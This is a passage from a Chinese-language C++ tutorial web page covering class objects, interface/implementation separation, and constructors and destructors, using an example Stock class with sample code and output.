<span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建两个 Stock 对象 (实例)</span></span><br><span class="line">    Stock stock1;</span><br><span class="line">    Stock stock2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用点号 . (成员访问运算符) 调用对象的公有成员函数</span></span><br><span class="line">    stock1.acquire(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">20</span>, <span class="number">12.50</span>);</span><br><span class="line">    stock1.show(); <span class="comment">// 显示 stock1 的信息</span></span><br><span class="line"></span><br><span class="line">    stock2.acquire(<span class="string">&quot;Boffo Objects&quot;</span>, <span class="number">2</span>, <span class="number">180.0</span>);</span><br><span class="line">    stock2.show(); <span class="comment">// 显示 stock2 的信息</span></span><br><span class="line"></span><br><span class="line">    stock2.buy(<span class="number">5</span>, <span class="number">190.0</span>); <span class="comment">// 增持 stock2</span></span><br><span class="line">    stock2.show();</span><br><span class="line"></span><br><span class="line">    stock1.sell(<span class="number">10</span>, <span class="number">15.75</span>); <span class="comment">// 卖出部分 stock1</span></span><br><span class="line">    stock1.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误！不能直接访问私有成员</span></span><br><span class="line">    <span class="comment">// stock1.shares = 50; // 编译错误</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; stock1.company; // 编译错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>Stock stock1;</code> 创建了一个名为 <code>stock1</code> 的 <code>Stock</code> 类型的对象。</li><li>  使用<strong>成员访问运算符（点号 <code>.</code>）</strong>来调用对象的公有成员函数，例如 <code>stock1.acquire(...)</code> 或 <code>stock2.show()</code>。</li><li>  每个对象都有自己的一套数据成员。<code>stock1</code> 的 <code>shares</code> 和 <code>stock2</code> 的 <code>shares</code> 是相互独立的。</li><li>  你不能从对象外部直接访问 <code>private</code> 成员，这强制你必须通过类提供的公共接口（<code>public</code> 函数）来与对象交互。</li></ul><h3 id="10-2-5-修改实现"><a href="#10-2-5-修改实现" class="headerlink" title="10.2.5 修改实现"></a>10.2.5 修改实现</h3><p>将类的接口（头文件中的声明）和实现（源文件中的定义）分开的一个主要好处是<strong>封装</strong>带来的灵活性。</p><ul><li>  <strong>接口 (Interface):</strong> 头文件 (<code>stock.h</code>) 定义了如何<strong>使用</strong>这个类（公共成员函数）。使用类的代码（如 <code>main()</code> 函数）只需要包含头文件。</li><li>  <strong>实现 (Implementation):</strong> 源文件 (<code>stock.cpp</code>) 包含了成员函数具体如何工作。</li></ul><p>只要类的<strong>公共接口保持不变</strong>（函数名、参数、返回类型不变），你就可以自由地修改源文件中的<strong>实现细节</strong>（例如，改进 <code>set_tot</code> 的计算方式，或者改变内部数据的存储方式），而<strong>不需要修改或重新编译</strong>使用该类的其他代码文件（如包含 <code>main()</code> 的文件）。只需要重新编译实现文件 (<code>stock.cpp</code>) 并重新链接即可。</p><p>这大大降低了维护成本，并使得代码库更容易更新和改进。用户只关心“能做什么”（接口），而不必关心“怎么做”（实现）。</p><h3 id="10-2-6-小结"><a href="#10-2-6-小结" class="headerlink" title="10.2.6 小结"></a>10.2.6 小结</h3><ul><li>  <strong>抽象</strong>是关注本质、忽略细节的编程思想。</li><li>  <strong>类</strong>是C++实现抽象和创建用户定义类型的主要机制。</li><li>  类将<strong>数据（成员变量）</strong>和<strong>操作数据的函数（成员函数）</strong>捆绑在一起。</li><li>  <strong>访问说明符</strong>（<code>public</code>, <code>private</code>, <code>protected</code>）控制对类成员的访问。</li><li>  <strong>数据隐藏</strong>（通常将数据设为 <code>private</code>）是封装的关键，保护数据并隐藏实现细节。</li><li>  <strong>公共接口</strong>（<code>public</code> 成员函数）定义了如何与类的对象交互。</li><li>  成员函数通常在类外部使用<strong>作用域解析运算符 <code>::</code></strong> 来定义。</li><li>  使用<strong>点号 <code>.</code></strong> 访问对象的公有成员。</li><li>  将接口和实现分离（头文件/源文件）可以提高代码的模块化和可维护性。</li></ul><h2 id="10-3-类的构造函数和析构函数"><a href="#10-3-类的构造函数和析构函数" class="headerlink" title="10.3 类的构造函数和析构函数"></a>10.3 类的构造函数和析构函数</h2><p>在上一节中，我们定义了一个 <code>Stock</code> 类，并通过 <code>acquire()</code> 成员函数来设置其初始状态。然而，C++ 提供了一种更自动化、更专门化的方式来处理对象的初始化和清理工作：<strong>构造函数 (Constructor)</strong> 和 **析构函数 (Destructor)**。</p><h3 id="10-3-1-声明和定义构造函数"><a href="#10-3-1-声明和定义构造函数" class="headerlink" title="10.3.1 声明和定义构造函数"></a>10.3.1 声明和定义构造函数</h3><p><strong>构造函数</strong>是一种特殊的成员函数，它的主要目的是在创建类的对象时<strong>初始化</strong>该对象的数据成员。</p><p><strong>特点与规则:</strong></p><ol><li> <strong>名称与类名相同:</strong> 构造函数的名称必须与它所属的类的名称完全一样。</li><li> <strong>没有返回类型:</strong> 构造函数没有声明返回类型，连 <code>void</code> 也没有。</li><li> <strong>自动调用:</strong> 当创建类的对象时，程序会自动调用相应的构造函数。</li><li> <strong>可以重载:</strong> 一个类可以有多个构造函数，只要它们的参数列表不同（参数个数、类型或顺序不同）。这允许以不同的方式初始化对象。</li></ol><p><strong>声明语法 (在类定义内):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数声明 (无参数)</span></span><br><span class="line">    ClassName();</span><br><span class="line">    <span class="comment">// 构造函数声明 (带参数)</span></span><br><span class="line">    ClassName(ParameterList);</span><br><span class="line">    <span class="comment">// ... 其他成员 ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>定义语法 (在类外部):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无参数构造函数定义</span></span><br><span class="line">ClassName::ClassName() &#123;</span><br><span class="line">    <span class="comment">// 初始化代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带参数构造函数定义</span></span><br><span class="line">ClassName::ClassName(ParameterList) &#123;</span><br><span class="line">    <span class="comment">// 使用参数进行初始化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：为 <code>Stock</code> 类添加构造函数</strong></p><p>我们可以为 <code>Stock</code> 类添加构造函数来替代之前的 <code>acquire()</code> 函数的部分功能，确保对象在创建时就被赋予有意义的初始值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 stock.h 的类定义中声明</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> company;</span><br><span class="line">    <span class="keyword">long</span> shares;</span><br><span class="line">    <span class="keyword">double</span> share_val;</span><br><span class="line">    <span class="keyword">double</span> total_val;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_tot</span><span class="params">()</span> </span>&#123; total_val = shares * share_val; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数声明 (两个版本)</span></span><br><span class="line">    Stock(); <span class="comment">// 默认构造函数 (无参数)</span></span><br><span class="line">    Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n = <span class="number">0</span>, <span class="keyword">double</span> pr = <span class="number">0.0</span>); <span class="comment">// 带参数的构造函数 (使用默认参数)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不再需要 acquire()，因为构造函数处理了初始设置</span></span><br><span class="line">    <span class="comment">// void acquire(const std::string &amp;co, long n, double pr);</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 stock.cpp 中定义构造函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认构造函数定义</span></span><br><span class="line">Stock::Stock() &#123; <span class="comment">// 默认构造函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default constructor called\n&quot;</span>; <span class="comment">// 只是为了演示</span></span><br><span class="line">    company = <span class="string">&quot;no name&quot;</span>;</span><br><span class="line">    shares = <span class="number">0</span>;</span><br><span class="line">    share_val = <span class="number">0.0</span>;</span><br><span class="line">    total_val = <span class="number">0.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带参数的构造函数定义</span></span><br><span class="line">Stock::Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Constructor using &quot;</span> &lt;&lt; co &lt;&lt; <span class="string">&quot; called\n&quot;</span>; <span class="comment">// 只是为了演示</span></span><br><span class="line">    company = co;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares can&#x27;t be negative; &quot;</span></span><br><span class="line">                  &lt;&lt; company &lt;&lt; <span class="string">&quot; shares set to 0.\n&quot;</span>;</span><br><span class="line">        shares = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares = n;</span><br><span class="line">    &#125;</span><br><span class="line">    share_val = pr;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... buy(), sell(), update(), show() 的定义保持不变 ...</span></span><br><span class="line"><span class="comment">// (注意：buy, sell, update 内部的 set_tot() 调用仍然需要)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares purchased can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares += num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares sold can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; shares) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You can&#x27;t sell more than you have! &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares -= num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::update</span><span class="params">(<span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    share_val = price;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags orig =</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::streamsize prec = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Company: &quot;</span> &lt;&lt; company</span><br><span class="line">              &lt;&lt; <span class="string">&quot;  Shares: &quot;</span> &lt;&lt; shares &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Share Price: $&quot;</span> &lt;&lt; share_val;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Total Worth: $&quot;</span> &lt;&lt; total_val &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(orig, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(prec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-3-2-使用构造函数"><a href="#10-3-2-使用构造函数" class="headerlink" title="10.3.2 使用构造函数"></a>10.3.2 使用构造函数</h3><p>当创建对象时，编译器会自动选择匹配的构造函数来执行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// 包含 Stock 类定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用带参数的构造函数 Stock(const std::string &amp;co, long n, double pr)</span></span><br><span class="line">    <span class="function">Stock <span class="title">stock1</span><span class="params">(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">12</span>, <span class="number">20.0</span>)</span></span>; <span class="comment">// 显式提供所有参数</span></span><br><span class="line">    stock1.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用带参数的构造函数，利用了 n 和 pr 的默认值 (n=0, pr=0.0)</span></span><br><span class="line">    <span class="function">Stock <span class="title">stock2</span><span class="params">(<span class="string">&quot;Boffo Objects&quot;</span>)</span></span>; <span class="comment">// 等同于 Stock(&quot;Boffo Objects&quot;, 0, 0.0)</span></span><br><span class="line">    stock2.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用默认构造函数 Stock()</span></span><br><span class="line">    Stock stock3; <span class="comment">// 注意：这里不能写 stock3()</span></span><br><span class="line">    stock3.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以使用 C++11 的列表初始化</span></span><br><span class="line">    Stock stock4 = &#123;<span class="string">&quot;Fleep Enterprises&quot;</span>, <span class="number">100</span>, <span class="number">1.25</span>&#125;; <span class="comment">// 调用带参数构造函数</span></span><br><span class="line">    stock4.show();</span><br><span class="line"></span><br><span class="line">    Stock stock5&#123;<span class="string">&quot;Dummy Corp&quot;</span>&#125;; <span class="comment">// 调用带参数构造函数 (利用默认值)</span></span><br><span class="line">    stock5.show();</span><br><span class="line"></span><br><span class="line">    Stock stock6&#123;&#125;; <span class="comment">// 调用默认构造函数 Stock()</span></span><br><span class="line">    stock6.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 动态分配对象时也会调用构造函数</span></span><br><span class="line">    Stock *p_stock = <span class="keyword">new</span> Stock(<span class="string">&quot;Electroshock Games&quot;</span>, <span class="number">18</span>, <span class="number">19.0</span>);</span><br><span class="line">    p_stock-&gt;show();</span><br><span class="line">    <span class="keyword">delete</span> p_stock; <span class="comment">// 稍后会看到 delete 会调用析构函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出可能包含 (取决于编译器和优化):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Constructor using NanoSmart called</span><br><span class="line">Company: NanoSmart  Shares: 12</span><br><span class="line">  Share Price: $20.000  Total Worth: $240.00</span><br><span class="line">Constructor using Boffo Objects called</span><br><span class="line">Company: Boffo Objects  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Default constructor called</span><br><span class="line">Company: no name  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Constructor using Fleep Enterprises called</span><br><span class="line">Company: Fleep Enterprises  Shares: 100</span><br><span class="line">  Share Price: $1.250  Total Worth: $125.00</span><br><span class="line">Constructor using Dummy Corp called</span><br><span class="line">Company: Dummy Corp  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Default constructor called</span><br><span class="line">Company: no name  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Constructor using Electroshock Games called</span><br><span class="line">Company: Electroshock Games  Shares: 18</span><br><span class="line">  Share Price: $19.000  Total Worth: $342.00</span><br></pre></td></tr></table></figure><h3 id="10-3-3-默认构造函数"><a href="#10-3-3-默认构造函数" class="headerlink" title="10.3.3 默认构造函数"></a>10.3.3 默认构造函数</h3><p><strong>默认构造函数 (Default Constructor)</strong> 是指<strong>不接受任何参数</strong>的构造函数。</p><ul><li>  <strong>编译器生成的默认构造函数:</strong> 如果你<strong>没有</strong>为类定义<strong>任何</strong>构造函数，编译器会自动为你生成一个默认构造函数。这个合成的构造函数什么也不做（对于内置类型成员不会初始化，对于类类型成员会调用其默认构造函数）。</li><li>  <strong>用户定义的默认构造函数:</strong> 如果你定义了一个无参数的构造函数（如上面 <code>Stock::Stock()</code>），那么它就是默认构造函数。</li><li>  <strong>重要规则:</strong> 如果你为类定义了<strong>任何</strong>构造函数（即使是带参数的），编译器就<strong>不会</strong>再自动生成默认构造函数了。如果你还需要一个无参数的构造函数（例如，为了能创建 <code>Stock stock3;</code> 这样的对象），你就必须<strong>显式地定义</strong>它。</li></ul><p>在我们的 <code>Stock</code> 示例中，因为我们定义了 <code>Stock(const std::string &amp;co, ...)</code>，编译器就不会自动生成默认构造函数。因此，我们必须自己提供 <code>Stock::Stock()</code>，否则 <code>Stock stock3;</code> 这样的声明将导致编译错误。</p><p><strong>C++11 <code>= default</code>:</strong> 如果你定义了其他构造函数，但仍希望编译器为你生成默认的、行为简单的默认构造函数，可以使用 <code>= default</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Example(<span class="keyword">int</span> v) : value(v) &#123;&#125; <span class="comment">// 用户定义的带参构造函数</span></span><br><span class="line">    Example() = <span class="keyword">default</span>; <span class="comment">// 显式要求编译器生成默认构造函数</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="10-3-4-析构函数"><a href="#10-3-4-析构函数" class="headerlink" title="10.3.4 析构函数"></a>10.3.4 析构函数</h3><p><strong>析构函数 (Destructor)</strong> 是另一种特殊的成员函数，它的主要目的是在对象<strong>生命周期结束</strong>时执行清理工作。</p><p><strong>用途:</strong></p><ul><li>  释放对象在生命周期内分配的资源（例如，通过 <code>new</code> 分配的内存）。</li><li>  执行任何必要的关闭操作（例如，关闭文件、断开网络连接）。</li></ul><p><strong>特点与规则:</strong></p><ol><li> <strong>名称:</strong> 析构函数的名称是在类名前加上波浪号 <code>~</code>（例如 <code>~Stock</code>）。</li><li> <strong>没有返回类型:</strong> 和构造函数一样，析构函数也没有返回类型，连 <code>void</code> 也没有。</li><li> <strong>没有参数:</strong> 析构函数不能接受任何参数，因此不能被重载。一个类最多只有一个析构函数。</li><li><strong>自动调用:</strong> 当对象被销毁时，析构函数会自动被调用。这发生在：<ul><li>  对象的<strong>作用域结束</strong>时（对于自动存储对象，如函数内的局部对象）。</li><li>  当对指向对象的指针调用 <code>delete</code> 时（对于动态存储对象）。</li><li>  当包含该对象的对象被销毁时。</li></ul></li></ol><p><strong>声明语法 (在类定义内):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... 构造函数和其他成员 ...</span></span><br><span class="line">    <span class="comment">// 析构函数声明</span></span><br><span class="line">    ~ClassName();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>定义语法 (在类外部):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassName::~ClassName() &#123;</span><br><span class="line">    <span class="comment">// 清理代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：为 <code>Stock</code> 类添加析构函数</strong></p><p>对于我们当前的 <code>Stock</code> 类，它并没有在内部使用 <code>new</code> 分配内存，所以析构函数不是严格必需的。但为了演示，我们可以添加一个简单的析构函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 stock.h 的类定义中声明</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... constructors ...</span></span><br><span class="line">    <span class="comment">// ... other public methods ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 析构函数声明</span></span><br><span class="line">    ~Stock();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 stock.cpp 中定义析构函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... constructor definitions ...</span></span><br><span class="line"><span class="comment">// ... other method definitions ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 析构函数定义</span></span><br><span class="line">Stock::~Stock() &#123;</span><br><span class="line">    <span class="comment">// 对于这个简单的 Stock 类，没什么需要显式清理的</span></span><br><span class="line">    <span class="comment">// 但我们可以加一条打印语句来观察它何时被调用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bye, &quot;</span> &lt;&lt; company &lt;&lt; <span class="string">&quot;!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>观察析构函数的调用:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 